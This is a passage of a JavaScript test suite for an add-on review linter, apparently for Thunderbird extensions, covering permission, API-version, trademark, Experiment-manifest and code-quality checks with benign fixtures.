    ]),
    addon: {
      recheck: [
        {
          check: "unused-permission-recheck",
          item: "tabs",
          verdict: VERDICT.FAIL,
          reason: "no tab property read",
        },
        {
          check: "unused-permission-recheck",
          item: "downloads",
          verdict: VERDICT.UNSURE,
          reason: "cannot tell",
        },
        {
          check: "unused-permission-recheck",
          item: "storage",
          verdict: VERDICT.PASS,
          reason: "used by storage.local",
        },
      ],
    },
  };
  const out = unusedPermissionRecheck.run(withManifest(ctx), check);
  assert.equal(out.findings.length, 1);
  assert.equal(out.findings[0].item, "tabs"); // fail -> finding
  assert.equal(out.findings[0].loc.line, 4); // the permission's manifest line
  assert.deepEqual(
    out.escalations.map((e) => e.item),
    ["downloads"] // unsure -> manual; storage (pass) is dropped
  );
});

test("unused-permission-recheck is a no-op with nothing handed over", () => {
  assert.deepEqual(
    unusedPermissionRecheck.run(withManifest({}), {
      id: "unused-permission-recheck",
    }),
    {
      findings: [],
      escalations: [],
    }
  );
});

// ---- deprecated-api ----
// A deprecated API's hint is the schema's own deprecation message (the migration
// note), not a link to the deprecated item. A "too new" API (version_added beyond
// the supported range) is NOT deprecated-api's concern - it belongs to the
// strict-min/strict-max-version-api checks, so deprecated-api ignores it.
test("deprecated-api hint is the schema deprecation message, not a doc link", () => {
  const ctx = {
    schema,
    addon: {
      manifest: { background: { scripts: ["bg.js"] } },
      files: new Map([["bg.js", Buffer.from("")]]),
    },
    apiUsages: [
      {
        file: "bg.js",
        usages: [
          { segments: ["messages", "oldOne"], line: 1, column: 0 },
          { segments: ["messages", "future"], line: 2, column: 0 },
        ],
      },
    ],
  };
  const out = deprecatedApi.run(withManifest(ctx));
  const old = out.find((f) => f.item === "messages.oldOne");
  assert.equal(old.hint, "Use list() instead."); // schema message, not a URL
  // messages.future is "too new", not deprecated -> deprecated-api ignores it.
  assert.equal(
    out.some((f) => f.item === "messages.future"),
    false
  );
});

// ---- unknown-api: version_added:false is unsupported ----
// The schemas carry no `unsupported` key; a documented-but-unavailable Firefox
// API is marked `version_added: false`. unknown-api must flag it (and only it).
test("unknown-api flags version_added:false as unsupported", () => {
  const local = buildSchemaIndex({
    files: {
      t: [
        {
          namespace: "t",
          functions: [
            { name: "gone", annotations: [{ version_added: false }] },
            { name: "ok", annotations: [{ version_added: "60" }] },
          ],
        },
      ],
    },
  });
  assert.equal(
    SchemaIndex.isUnsupported(local.resolveApi(["t", "gone"]).def),
    true
  );
  const ctx = {
    schema: local,
    addon: {
      manifest: { background: { scripts: ["bg.js"] } },
      files: new Map([["bg.js", Buffer.from("")]]),
    },
    apiUsages: [
      {
        file: "bg.js",
        usages: [
          { root: "browser", segments: ["t", "gone"], line: 1, column: 0 },
          { root: "browser", segments: ["t", "ok"], line: 2, column: 0 },
        ],
      },
    ],
  };
  const out = unknownApi.run(withManifest(ctx));
  assert.equal(out.length, 1);
  assert.equal(out[0].item, "browser.t.gone");
});

// A FEATURE-DETECTED (guarded) reference to an unknown MEMBER or an unsupported API is
// skipped (the fallback runs where it's missing). A guarded unknown NAMESPACE is exempt
// (still flagged - a whole missing namespace is likely a hallucination), and any
// UNGUARDED unavailable API is flagged. So the skip is scoped to guarded member/unsupported.
test("unknown-api skips guarded members/unsupported but flags guarded namespaces", () => {
  const local = buildSchemaIndex({
    files: {
      t: [
        {
          namespace: "t",
          functions: [
            { name: "gone", annotations: [{ version_added: false }] },
            { name: "ok", annotations: [{ version_added: "60" }] },
          ],
        },
      ],
    },
  });
  const g = (segments, line, guarded) => ({
    root: "browser",
    segments,
    line,
    column: 0,
    guarded,
  });
  const ctx = withManifest({
    schema: local,
    addon: {
      manifest: { background: { scripts: ["bg.js"] } },
      files: new Map([["bg.js", Buffer.from("")]]),
    },
    apiUsages: [
      {
        file: "bg.js",
        usages: [
          g(["t", "gone"], 1, true), // unsupported, guarded -> skipped
          g(["t", "nope"], 2, true), // unknown member, guarded -> skipped
          g(["nope", "x"], 3, true), // unknown NAMESPACE, guarded -> FLAGGED
          g(["t", "gone"], 4, false), // unsupported, UNGUARDED -> flagged
        ],
      },
    ],
  });
  const out = unknownApi.run(ctx);
  // Only the guarded namespace (line 3 -> browser.nope) and the unguarded unsupported
  // (line 4 -> browser.t.gone) are findings; the guarded member/unsupported are skipped.
  assert.deepEqual(out.map((f) => `${f.loc.line}:${f.item}`).sort(), [
    "3:browser.nope",
    "4:browser.t.gone",
  ]);
});

// End-to-end (the thinbox folders shape): a namespace captured into a local, then a
// call to a non-existent member feature-detected with an if-guard. Parses to a guarded
// usage of an unknown member, which unknown-api skips - no finding. RED before the
// alias-aware guard fix (m.nope() would be guarded:false -> flagged).
test("unknown-api: alias-guarded call to an unknown member is skipped end-to-end", () => {
  const src = `const m = browser.messages; if (m.nope) m.nope();`;
  const { usages } = parseApiUsage(src);
  const out = unknownApi.run(
    withManifest({
      schema, // messages is a known namespace; messages.nope is an unknown member
      addon: {
        manifest: { background: { scripts: ["bg.js"] } },
        files: new Map([["bg.js", Buffer.from(src)]]),
      },
      apiUsages: [{ file: "bg.js", usages }],
    })
  );
  assert.deepEqual(out, []);
});

// ---- api-resolution: the shared usage resolution ----
// resolveApiUsages resolves each reachable, non-bare browser.* usage once;
// unknownApis is the subset the schema does not recognize (what unknown-api flags).
test("resolveApiUsages resolves reachable usages once; unknownApis is the unrecognized subset", () => {
  const local = buildSchemaIndex({
    files: {
      t: [
        {
          namespace: "t",
          functions: [{ name: "ok", annotations: [{ version_added: "60" }] }],
        },
      ],
    },
  });
  const ctx = withManifest({
    schema: local,
    addon: {
      manifest: { background: { scripts: ["bg.js"] } },
      files: new Map([
        ["bg.js", Buffer.from("")],
        ["orphan.js", Buffer.from("")], // present but reached from no entry point
      ]),
    },
    apiUsages: [
      {
        file: "bg.js",
        usages: [
          { root: "browser", segments: ["mystery"], line: 1, column: 0 }, // unknown ns
          { root: "browser", segments: ["t", "ok"], line: 2, column: 0 }, // known
          { root: "browser", segments: [], line: 3, column: 0 }, // bare browser - dropped
        ],
      },
      {
        // An unreachable file: its usages are outside the pure-WebExtension tree, so
        // they must not appear in the resolution at all.
        file: "orphan.js",
        usages: [{ root: "browser", segments: ["ghost"], line: 1, column: 0 }],
      },
    ],
  });
  const resolved = resolveApiUsages(ctx);
  assert.equal(resolved.length, 2); // bg.js's 2 non-bare usages; bare + unreachable dropped
  assert.ok(
    !resolved.some((u) => u.file === "orphan.js"),
    "an unreachable file's usages are excluded"
  );
  const unknown = unknownApis(ctx);
  assert.equal(unknown.length, 1); // only browser.mystery (ghost is unreachable)
  assert.equal(unknown[0].usage.segments[0], "mystery");
});

// ---- strict-max-version-api ----
// version_added beyond the declared strict_max_version: no supported install has
// the API. Major-granularity compare (strict_max is conventionally "N.*").
const maxCtx = (max, usages) => ({
  schema,
  addon: {
    // bg.js must be in the pure WebExtension tree for the validators to check it.
    files: new Map([["bg.js", Buffer.from("")]]),
    manifest: {
      background: { scripts: ["bg.js"] },
      ...(max
        ? { browser_specific_settings: { gecko: { strict_max_version: max } } }
        : {}),
    },
  },
  apiUsages: [{ file: "bg.js", usages }],
});

test("strict-max-version-api flags an API added after strict_max_version", () => {
  const out = strictMaxVersionApi.run(
    withManifest(
      maxCtx("140.*", [
        {
          root: "messenger",
          segments: ["messages", "future"],
          line: 12,
          column: 4,
        }, // va 200
        {
          root: "messenger",
          segments: ["messages", "list"],
          line: 13,
          column: 4,
        }, // va 66
      ])
    )
  );
  assert.equal(out.length, 1);
  assert.equal(out[0].item, "messenger.messages.future()");
  assert.equal(out[0].hint, "added in Thunderbird 200");
  assert.equal(out[0].data.max, "140.*");
  assert.equal(out[0].file, "bg.js");
  assert.deepEqual(out[0].loc, { line: 12, column: 4 });
});

test("strict-max-version-api passes when strict_max_version covers the API", () => {
  const out = strictMaxVersionApi.run(
    withManifest(
      maxCtx("250.*", [
        {
          root: "messenger",
          segments: ["messages", "future"],
          line: 1,
          column: 0,
        }, // 200 <= 250
      ])
    )
  );
  assert.equal(out.length, 0);
});

test("strict-max-version-api is skipped without strict_max_version", () => {
  const out = strictMaxVersionApi.run(
    withManifest(
      maxCtx(null, [
        {
          root: "messenger",
          segments: ["messages", "future"],
          line: 1,
          column: 0,
        },
      ])
    )
  );
  assert.equal(out.length, 0);
});

// ---- strict-min-version-api ----
// version_added newer than the declared strict_min_version: installs at the low
// end of the supported range lack the API. Tuple compare (minor/patch matter).
const minCtx = (min, usages) => ({
  schema,
  addon: {
    // bg.js must be in the pure WebExtension tree for the validators to check it.
    files: new Map([["bg.js", Buffer.from("")]]),
    manifest: {
      background: { scripts: ["bg.js"] },
      ...(min
        ? { browser_specific_settings: { gecko: { strict_min_version: min } } }
        : {}),
    },
  },
  apiUsages: [{ file: "bg.js", usages }],
});

test("strict-min-version-api flags APIs added after strict_min_version", () => {
  const out = strictMinVersionApi.run(
    withManifest(
      minCtx("60.0", [
        {
          root: "messenger",
          segments: ["messages", "future"],
          line: 12,
          column: 4,
        }, // va 200
        {
          root: "messenger",
          segments: ["messages", "list"],
          line: 13,
          column: 4,
        }, // va 66
      ])
    )
  );
  assert.equal(out.findings.length, 2); // 200 and 66 both > 60, both unguarded
  assert.equal(out.llm, undefined); // nothing guarded -> no LLM candidates
  const f = out.findings.find((x) => x.item === "messenger.messages.future()");
  assert.equal(f.hint, "added in Thunderbird 200");
  assert.equal(f.data.min, "60.0");
  assert.equal(f.file, "bg.js");
  assert.deepEqual(f.loc, { line: 12, column: 4 });
});

test("strict-min-version-api passes when strict_min_version >= version_added", () => {
  const out = strictMinVersionApi.run(
    withManifest(
      minCtx("128.0", [
        {
          root: "messenger",
          segments: ["messages", "list"],
          line: 1,
          column: 0,
        }, // 66 <= 128
      ])
    )
  );
  assert.equal(out.findings.length, 0);
});

test("strict-min-version-api is skipped without strict_min_version", () => {
  const out = strictMinVersionApi.run(
    withManifest(
      minCtx(null, [
        {
          root: "messenger",
          segments: ["messages", "future"],
          line: 1,
          column: 0,
        },
      ])
    )
  );
  assert.equal(out.findings.length, 0);
});

test("strict-min-version-api compares minor/patch components", () => {
  const local = buildSchemaIndex({
    files: {
      t: [
        {
          namespace: "t",
          functions: [
            { name: "f", annotations: [{ version_added: "140.4.1" }] },
          ],
        },
      ],
    },
  });
  const run = (min) =>
    strictMinVersionApi.run(
      withManifest({
        schema: local,
        addon: {
          files: new Map([["bg.js", Buffer.from("")]]),
          manifest: {
            background: { scripts: ["bg.js"] },
            browser_specific_settings: { gecko: { strict_min_version: min } },
          },
        },
        apiUsages: [
          {
            file: "bg.js",
            usages: [
              { root: "browser", segments: ["t", "f"], line: 1, column: 0 },
            ],
          },
        ],
      })
    );
  assert.equal(run("140.4.0").findings.length, 1); // 140.4.1 > 140.4.0 -> flag
  assert.equal(run("140.4.1").findings.length, 0); // equal -> not flagged
  assert.equal(run("140.5.0").findings.length, 0); // 140.4.1 < 140.5.0 -> not flagged
});

// A too-new API carrying a guard signal (usage.guarded, set by api-usage.js for
// optional chaining / a feature-detection or version gate) is not a hard error: it
// becomes one LLM candidate, judged from the call's file. resolve maps the verdict.
test("strict-min-version-api defers a guarded too-new API to the LLM", () => {
  const out = strictMinVersionApi.run(
    withManifest(
      minCtx("60.0", [
        {
          root: "messenger",
          segments: ["messages", "future"],
          line: 5,
          column: 2,
          guarded: true,
        }, // va 200, guarded
      ])
    )
  );
  assert.equal(out.findings.length, 0); // not a deterministic finding
  assert.equal(out.llm.candidates.length, 1);
  const c = out.llm.candidates[0];
  assert.equal(c.file, "bg.js");
  assert.deepEqual(c.corpus, ["bg.js"]); // local judgement: just the call's file
  assert.match(c.note, /messenger\.messages\.future/);
  // fail -> finding, pass -> drop, unsure (no verdict) -> manual.
  const fail = out.llm.resolve(new Map([[c.id, { verdict: VERDICT.FAIL }]]));
  assert.equal(fail.findings.length, 1);
  assert.equal(fail.findings[0].item, "messenger.messages.future()");
  assert.equal(fail.findings[0].data.min, "60.0");
  const pass = out.llm.resolve(new Map([[c.id, { verdict: VERDICT.PASS }]]));
  assert.equal(pass.findings.length, 0);
  assert.equal(pass.manual.length, 0);
  const unsure = out.llm.resolve(new Map()); // no token / no verdict -> manual
  assert.equal(unsure.manual.length, 1);
});

// End-to-end: alias-guarded source parses to a GUARDED usage (via api-usage's alias-aware
// guard detection), which strict-min-version-api routes to the LLM, not a hard finding.
// RED before the fix: `m.future()` would parse guarded:false -> a deterministic finding.
// An if-guard (no typeof) is used so it exercises the alias path, not the typeof shortcut.
test("strict-min-version-api: alias-guarded source becomes a candidate, not a finding", () => {
  const src = `const m = browser.messages; if (m.future) m.future();`;
  const { usages } = parseApiUsage(src);
  const out = strictMinVersionApi.run(
    withManifest({
      schema,
      addon: {
        files: new Map([["bg.js", Buffer.from(src)]]),
        manifest: {
          background: { scripts: ["bg.js"] },
          browser_specific_settings: { gecko: { strict_min_version: "60.0" } },
        },
      },
      apiUsages: [{ file: "bg.js", usages }],
    })
  );
  assert.equal(out.findings.length, 0); // guarded -> not a hard finding
  assert.equal(out.llm.candidates.length, 1); // deferred to the LLM
  assert.match(out.llm.candidates[0].note, /messages\.future/);
});

// An API used UNGUARDED anywhere is a hard error, even if another site is guarded:
// the unguarded site wins and there is no LLM candidate for it.
test("strict-min-version-api: an unguarded site wins over a guarded one", () => {
  const out = strictMinVersionApi.run(
    withManifest(
      minCtx("60.0", [
        {
          root: "messenger",
          segments: ["messages", "future"],
          line: 5,
          column: 2,
          guarded: true,
        },
        {
          root: "messenger",
          segments: ["messages", "future"],
          line: 9,
          column: 0,
        }, // unguarded
      ])
    )
  );
  assert.equal(out.llm, undefined); // no candidate - it is a hard finding
  assert.equal(out.findings.length, 1);
  assert.deepEqual(out.findings[0].loc, { line: 9, column: 0 });
});

// strict-min-version-api ignores a non-existent API entirely (never a candidate).
// unknown-api owns it, and per policy still flags a guarded unknown NAMESPACE (a whole
// missing namespace is likely a hallucination) - only a guarded unknown MEMBER /
// unsupported API is skipped there (covered by the guarded-skip test above).
test("a guarded non-existent namespace: strict-min ignores it, unknown-api still flags it", () => {
  const usages = [
    {
      root: "messenger",
      segments: ["fake", "nope"],
      line: 1,
      column: 0,
      guarded: true,
    },
  ];
  const out = strictMinVersionApi.run(withManifest(minCtx("60.0", usages)));
  assert.equal(out.findings.length, 0);
  assert.equal(out.llm, undefined); // never a candidate

  const flagged = unknownApi.run(
    withManifest({
      schema,
      addon: {
        manifest: { background: { scripts: ["bg.js"] } },
        files: new Map([["bg.js", Buffer.from("")]]),
      },
      apiUsages: [{ file: "bg.js", usages }],
    })
  );
  assert.equal(flagged.length, 1); // guarded unknown NAMESPACE is still flagged
  assert.match(flagged[0].item, /^messenger\.fake/);
});

// ---- permission analysis: dead files are ignored ----
// A usage counts only when its file actually runs. messages.get needs
// 'messagesRead'; in a live background script that is a missing-permission
// finding, but the same call in an unreferenced (dead) file raises nothing.
const GET_USAGE = [{ segments: ["messages", "get"], line: 3, column: 0 }];

test("missing-permission ignores usages in dead (unreachable) files", () => {
  const ctx = (file) => ({
    schema,
    addon: {
      manifest: { permissions: [], background: { scripts: ["bg.js"] } },
      files: new Map([
        ["bg.js", Buffer.from("")],
        ["dead.js", Buffer.from("messenger.messages.get(1);")],
      ]),
    },
    apiUsages: [{ file, usages: GET_USAGE }],
  });
  // Live: the call sits in the background script -> messagesRead flagged missing.
  const live = missingPermission.run(withManifest(ctx("bg.js")));
  assert.ok(live.some((f) => f.item === "messagesRead"));
  // Dead: dead.js is never referenced by the manifest -> no missing finding.
  assert.equal(missingPermission.run(withManifest(ctx("dead.js"))).length, 0);
});

// The broadened alias resolution surfaces a permission reached ONLY via a captured
// namespace (previously invisible - a false negative). Parsing an aliased
// `m.archive([1])` with no declared permissions must now flag messagesMove (function
// level) + messagesRead (namespace level) as missing.
test("missing-permission fires for a permission reached only via a namespace alias", () => {
  const src = `const m = browser.messages; m.archive([1]);`;
  const { usages } = parseApiUsage(src);
  const out = missingPermission.run(
    withManifest({
      schema,
      addon: {
        manifest: { permissions: [], background: { scripts: ["bg.js"] } },
        files: new Map([["bg.js", Buffer.from(src)]]),
      },
      apiUsages: [{ file: "bg.js", usages }],
    })
  );
  const items = out.map((f) => f.item);
  assert.ok(items.includes("messagesMove"));
  assert.ok(items.includes("messagesRead"));
});

// usedPermissions records the permissions a REACHABLE call provably requires; a
// usage only in a dead file does not count (same reachability gate as above).
test("usedPermissions tracks reachable requirements, not dead-file ones", () => {
  const ctx = (file) => ({
    schema,
    addon: {
      manifest: {
        permissions: ["messagesRead"],
        background: { scripts: ["bg.js"] },
      },
      files: new Map([
        ["bg.js", Buffer.from("")],
        ["dead.js", Buffer.from("messenger.messages.get(1);")],
      ]),
    },
    apiUsages: [{ file, usages: GET_USAGE }],
  });
  assert.ok(
    getPermissionAnalysis(withManifest(ctx("bg.js"))).usedPermissions.has(
      "messagesRead"
    )
  );
  assert.ok(
    !getPermissionAnalysis(withManifest(ctx("dead.js"))).usedPermissions.has(
      "messagesRead"
    )
  );
});

// The no-LLM checklist drops a declared permission a reachable call provably
// needs (messages.get -> messagesRead), escalating only the unproven ones.
test("unused-permission omits permissions a reachable call requires", () => {
  const manifest = {
    permissions: ["messagesRead", "tabs"],
    background: { scripts: ["bg.js"] },
    browser_specific_settings: { gecko: { strict_min_version: "154" } },
  };
  const ctx = {
    schema,
    addon: {
      manifest,
      files: new Map([
        ["manifest.json", Buffer.from(JSON.stringify(manifest, null, 2))],
        ["bg.js", Buffer.from("messenger.messages.get(1);")],
      ]),
    },
    apiUsages: [{ file: "bg.js", usages: GET_USAGE }],
  };
  const out = unusedPermissionProducer.run(withManifest(ctx));
  // messagesRead is proven used -> not escalated; tabs has no proven need -> kept.
  assert.deepEqual(
    out.escalations.map((e) => e.item),
    ["tabs"]
  );
});

// ---- unused-permission is version-agnostic (D308076) ----
// The single producer enumerates unused permissions regardless of strict_min_version.
// The version-specific tabs wording (D308076) moved to the registry's version-bounded
// tabs permission-prompts, selected at recheck-assembly time (see recheck.test.js).
const permProducerCtx = (strictMin) => {
  const manifest = {
    permissions: ["tabs"],
    ...(strictMin === undefined
      ? {}
      : {
          browser_specific_settings: {
            gecko: { strict_min_version: strictMin },
          },
        }),
  };
  return {
    schema,
    addon: {
      manifest,
      files: new Map([
        ["manifest.json", Buffer.from(JSON.stringify(manifest, null, 2))],
      ]),
    },
    apiUsages: [],
  };
};

test("unused-permission enumerates regardless of strict_min_version", () => {
  for (const min of ["154", "200", "153.9", "128", undefined, "abc", "≤59"]) {
    assert.deepEqual(
      unusedPermissionProducer
        .run(withManifest(permProducerCtx(min)))
        .escalations.map((e) => e.item),
      ["tabs"],
      `min=${String(min)}`
    );
  }
});

// ---- trademark-violation (deterministic name check) ----
// Firefox/Mozilla/MZLA are never allowed in the name; Thunderbird only as the
// trailing "for Thunderbird". Matching is case-insensitive, and a __MSG__ name
// is resolved from _locales (which a deterministic check can read).
test("trademark-violation flags forbidden brands in the (resolved) name", () => {
  const ctx = (name, files = {}) => ({
    addon: {
      manifest: { manifest_version: 3, name, version: "1" },
      files: new Map(
        Object.entries(files).map(([k, v]) => [k, Buffer.from(v)])
      ),
    },
  });
  const flags = (name, files) =>
    trademarkViolation.run(withManifest(ctx(name, files))).length;
  assert.equal(flags("Firefox Helper"), 1);
  assert.equal(flags("My Mozilla Thing"), 1);
  assert.equal(flags("MZLA Tools"), 1);
  assert.equal(flags("thunderbird helper"), 1); // case-insensitive
  assert.equal(flags("Calendar for Thunderbird"), 0); // allowed trailing form
  assert.equal(flags("Calendar Tool"), 0);
  // A localized __MSG__ name is resolved from _locales (and flagged).
  const locale = JSON.stringify({ extName: { message: "Firefox Sync" } });
  assert.equal(
    flags("__MSG_extName__", { "_locales/en/messages.json": locale }),
    1
  );
});

// The finding cites the manifest line of the `name` property and the offending
// (resolved) name, not a bare "manifest.json".
test("trademark-violation anchors the finding on the name line with the name", () => {
  const ctxOf = (name, files) =>
    withManifest({
      addon: {
        manifest: { manifest_version: 3, name, version: "1" },
        files: new Map(
          Object.entries(files).map(([k, v]) => [k, Buffer.from(v)])
        ),
      },
    });
  // A literal name: the line of the `name` property, and the name as the item.
  const literal = trademarkViolation.run(
    ctxOf("Firefox Helper", {
      "manifest.json":
        '{\n  "manifest_version": 3,\n  "name": "Firefox Helper"\n}\n',
    })
  );
  assert.equal(literal.length, 1);
  assert.equal(literal[0].loc.line, 3);
  assert.equal(literal[0].item, "Firefox Helper");

  // A __MSG__ name: still anchored on the manifest `name` line, but the item is the
  // resolved locale string (the actual offending name).
  const localized = trademarkViolation.run(
    ctxOf("__MSG_extName__", {
      "manifest.json": '{\n  "name": "__MSG_extName__"\n}\n',
      "_locales/en/messages.json": JSON.stringify({
        extName: { message: "Firefox Sync" },
      }),
    })
  );
  assert.equal(localized.length, 1);
  assert.equal(localized[0].loc.line, 2);
  assert.equal(localized[0].item, "Firefox Sync");
});

// ---- core-symbol-in-webext (privileged globals in pure WebExtension code) ----
// A GLOBAL reference to a core symbol (Services, ChromeUtils, Cc/Ci, ...) is flagged;
// a property of that name, an object key, and a name shadowed by a local binding or
// import are the developer's own and are exempt. (The Experiment-tree exemption is
// covered by the core-symbol-webext golden fixture, which builds real reachability.)
test("core-symbol-in-webext flags global core symbols, not locals/imports/properties", () => {
  // bg.js must be in the pure WebExtension tree to be checked, so declare it as the
  // background script and include it in the packaged files (the check gates on
  // pureWebExtensionReachable, not "every authored file").
  const run = (code) =>
    coreSymbolInWebext.run(
      withManifest({
        jsSources: parsed([{ file: "bg.js", code, lineOffset: 0 }]),
        addon: {
          manifest: { manifest_version: 3, background: { scripts: ["bg.js"] } },
          files: new Map([["bg.js", Buffer.from(code)]]),
        },
        options: {},
      })
    );
  // A bare global core reference is flagged (the root, not the property). The symbol
  // rides on `item`; the resolver surfaces it on the collapsed locus line (golden).
  assert.deepEqual(
    run(`Services.wm.getMostRecentWindow("x");`).map((f) => f.item),
    ["Services"]
  );
  assert.equal(run(`ChromeUtils.importESModule("x");`).length, 1);
  assert.equal(run(`Cc["@m/x"].getService(Ci.nsIFoo);`).length, 2); // Cc + Ci
  // Shadowed / imported / declared names are the dev's own symbol - exempt.
  assert.equal(run(`const Services = api(); Services.foo();`).length, 0);
  assert.equal(run(`import { Services } from "x"; Services.foo();`).length, 0);
  assert.equal(run(`function f(Services) { return Services.x; }`).length, 0);
  // A property or object key named like a core symbol is not a global reference.
  assert.equal(run(`obj.Services.foo(); ({ Services: 1 });`).length, 0);
  // De-duped per symbol: many uses of Services -> one finding.
  assert.equal(run(`Services.a(); Services.b(); Services.c();`).length, 1);
});

// ---- strict_max_version (Experiment vs not) ----
// Only relevant when experiments are allowed: an allowed Experiment lacking a
// strict_max_version errors; one that pins a max, a non-Experiment, and (key)
// any Experiment when experiments are NOT allowed all stay silent.
test("experiment-missing-strict-max-version flags an allowed Experiment lacking a max", () => {
  const run = (manifest) =>
    experimentMissingMax.run(
      withManifest({
        addon: { manifest },
        options: { allowExperiments: true },
      })
    );
  assert.equal(run({ experiment_apis: { a: {} } }).length, 1); // experiment, no max
  assert.equal(
    run({
      experiment_apis: { a: {} },
      browser_specific_settings: { gecko: { strict_max_version: "128.0" } },
    }).length,
    0 // experiment WITH a max -> ok
  );
  assert.equal(run({ name: "x" }).length, 0); // not an experiment -> silent
  // The check does not gate on allowExperiments: whether it runs at all is the
  // orchestrator's job (phase: default runs only for a VALID experiment - allowed
  // via the flag or a pristine upstream copy). Reached directly without the flag,
  // it still flags an experiment lacking a max.
  assert.equal(
    experimentMissingMax.run(
      withManifest({
        addon: { manifest: { experiment_apis: { a: {} } } },
        options: {},
      })
    ).length,
    1
  );
});

// Every Experiment submission escalates one whole-add-on manual review (a
// locus-less reminder, no findings); a non-Experiment escalates nothing.
test("experiment-manual-review escalates one reminder for an Experiment only", () => {
  const run = (manifest) =>
    experimentManualReview.run(withManifest({ addon: { manifest } }));
  const exp = run({ experiment_apis: { a: {} } });
  assert.deepEqual(exp.findings, []);
  assert.equal(exp.escalations.length, 1);
  assert.deepEqual(exp.escalations[0], {}); // whole-add-on, no locus
  assert.deepEqual(run({ name: "x" }).escalations, []); // not an experiment
});

// experiment-unknown-api escalates a single reminder ONLY when the add-on is an
// Experiment AND calls an API the schema does not recognize (a likely schema-namespace
// typo); a non-Experiment or a clean Experiment escalates nothing.
test("experiment-unknown-api escalates only for an Experiment with unrecognized API usage", () => {
  const local = buildSchemaIndex({
    files: {
      t: [
        {
          namespace: "t",
          functions: [{ name: "ok", annotations: [{ version_added: "60" }] }],
        },
      ],
    },
  });
  const ctxFor = (manifest, seg) =>
    withManifest({
      schema: local,
      addon: {
        manifest: { ...manifest, background: { scripts: ["bg.js"] } },
        files: new Map([["bg.js", Buffer.from("")]]),
      },
      apiUsages: [
        {
          file: "bg.js",
          usages: [{ root: "browser", segments: seg, line: 1, column: 0 }],
        },
      ],
    });
  // Experiment + an unknown API -> one locus-less reminder.
  const hit = experimentUnknownApi.run(
    ctxFor({ experiment_apis: { a: {} } }, ["mystery", "call"])
  );
  assert.deepEqual(hit.findings, []);
  assert.equal(hit.escalations.length, 1);
  assert.deepEqual(hit.escalations[0], {});
  // Non-Experiment + an unknown API -> nothing (unknown-api owns it).
  assert.deepEqual(
    experimentUnknownApi.run(ctxFor({}, ["mystery", "call"])).escalations,
    []
  );
  // Experiment with only recognized APIs -> nothing.
  assert.deepEqual(
    experimentUnknownApi.run(
      ctxFor({ experiment_apis: { a: {} } }, ["t", "ok"])
    ).escalations,
    []
  );
});

// A non-Experiment that pins strict_max_version warns and surfaces the value;
// the legacy applications.gecko key counts too, and an Experiment or a missing
// max stays silent.
test("non-experiment-strict-max-version flags only a non-Experiment that pins a max", () => {
  const run = (manifest) =>
    nonExperimentMax.run(withManifest({ addon: { manifest } }));
  const out = run({
    browser_specific_settings: { gecko: { strict_max_version: "128.0" } },
  });
  assert.equal(out.length, 1);
  assert.equal(out[0].item, "128.0"); // value surfaced for the {{item}} response
  // The finding anchors on the strict_max_version line of the manifest text.
  const located = nonExperimentMax.run(
    withManifest({
      addon: {
        manifest: {
          browser_specific_settings: { gecko: { strict_max_version: "128.0" } },
        },
        files: new Map([
          [
            "manifest.json",
            Buffer.from(
              '{\n  "browser_specific_settings": { "gecko": { "strict_max_version": "128.0" } }\n}\n'
            ),
          ],
        ]),
      },
    })
  );
  assert.equal(located[0].loc.line, 2);
  // Legacy applications.gecko key is also honored.
  assert.equal(
    run({ applications: { gecko: { strict_max_version: "115" } } }).length,
    1
  );
  // An Experiment with a max is the other check's concern -> silent here.
  assert.equal(
    run({
      experiment_apis: { a: {} },
      browser_specific_settings: { gecko: { strict_max_version: "128.0" } },
    }).length,
    0
  );
  assert.equal(run({ name: "x" }).length, 0); // no max -> silent
});

// With experiments disabled (the default), an Experiment errors on the
// experiment_apis manifest line; --allow-experiments silences it, and a
// non-Experiment is silent regardless.
test("experiment-not-allowed errors on the experiment_apis line unless allowed", () => {
  const ctx = (manifest, allowExperiments) => ({
    addon: {
      manifest,
      files: new Map([
        [
          "manifest.json",
          Buffer.from('{\n  "experiment_apis": { "x": {} }\n}\n'),
        ],
      ]),
    },
    options: { allowExperiments },
  });
  const out = experimentNotAllowed.run(
    withManifest(ctx({ experiment_apis: { x: {} } }, false))
  );
  assert.equal(out.length, 1);
  assert.equal(out[0].loc.line, 2); // attached to the experiment_apis line
  // --allow-experiments silences it.
  assert.equal(
    experimentNotAllowed.run(
      withManifest(ctx({ experiment_apis: { x: {} } }, true))
    ).length,
    0
  );
  // Not an Experiment -> silent regardless.
  assert.equal(
    experimentNotAllowed.run(withManifest(ctx({ name: "x" }, false))).length,
    0
  );
});

// ---- activity feed (ctx.note) ----
// Every check narrates each site it examines - pass and fail - to ctx.note, so
// the what-is-going-on feed shows what was investigated (not only the findings),
// grouped under the check. A check run without a note is unaffected.
test("sync-xhr notes each open() site (sync=fail, async=pass)", () => {
  const notes = notesFrom(
    syncXhr,
    jsCtx(`a.open("GET", "/u", false);\nb.open("GET", "/u", true);`)
  );
  assert.deepEqual(
    notes.map((n) => n.verdict),
    [VERDICT.FAIL, VERDICT.PASS]
  );
});

test("debugger-statement notes guarded (pass) and unconditional (fail)", () => {
  const notes = notesFrom(
    debuggerStatement,
    jsCtx(`debugger;\nif (D) debugger;`)
  );
  assert.deepEqual(
    new Set(notes.map((n) => n.verdict)),
    new Set([VERDICT.FAIL, VERDICT.PASS])
  );
});

test("minimize-host-permissions notes broad (fail) and scoped (pass) hosts", () => {
  const notes = notesFrom(
    minimizeHostPermissions,
    jsCtx("", { host_permissions: ["<all_urls>", "https://example.com/*"] })
  );
  assert.deepEqual(notes, [
    { file: "manifest.json", item: "<all_urls>", verdict: VERDICT.FAIL },
    {
      file: "manifest.json",
      item: "https://example.com/*",
      verdict: VERDICT.PASS,
    },
  ]);
});

test("missing-library / obfuscated-code note a verdict per classified file", () => {
  // A hash match marks lib.js a library (a UMD/.min shape alone does not).
  const lib =
    "(function () { if (typeof exports === 'object' && typeof define === 'function') {} })();\n".repeat(
      40
    );
  const readable = "function f(a) {\n  return a + 1;\n}\n".repeat(40);
  const libNotes = notesFrom(
    missingLibrary,
    filesCtx({ "lib.js": lib, "app.js": readable }, { libs: ["lib.js"] })
  );
  assert.equal(libNotes.find((n) => n.file === "lib.js").verdict, VERDICT.FAIL);
  assert.equal(libNotes.find((n) => n.file === "app.js").verdict, VERDICT.PASS);
  // obfuscated-code defers libraries to missing-library, so it notes only app.js.
  const obfNotes = notesFrom(
    obfuscatedCode,
    filesCtx({ "lib.js": lib, "app.js": readable }, { libs: ["lib.js"] })
  );
  assert.deepEqual(
    obfNotes.map((n) => n.file),
    ["app.js"]
  );
  assert.equal(obfNotes[0].verdict, VERDICT.PASS);
});

